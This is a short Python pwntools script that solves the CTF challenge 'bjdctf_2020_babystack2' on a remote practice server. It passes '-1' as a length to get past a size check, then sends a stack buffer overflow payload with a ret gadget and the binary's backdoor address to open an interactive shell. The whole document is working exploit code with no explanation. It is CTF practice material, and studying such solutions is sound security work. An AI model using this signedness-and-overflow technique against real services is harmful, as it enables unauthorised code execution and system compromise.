from pwn import *

#context.log_level = 'debug'

#p = process('./bjdctf_2020_babystack2')
p = remote('node3.buuoj.cn',25436)
elf = ELF('bjdctf_2020_babystack2')

#gdb.attach(p, 'b *0x400821')

backdoor = elf.sym['backdoor']
ret = 0x400599

p.sendlineafter('name:\n','-1')

payload = b'a' * (0x10 + 8) + p64(ret) + p64(backdoor)

p.sendlineafter('name?\n', payload)

p.interactive()
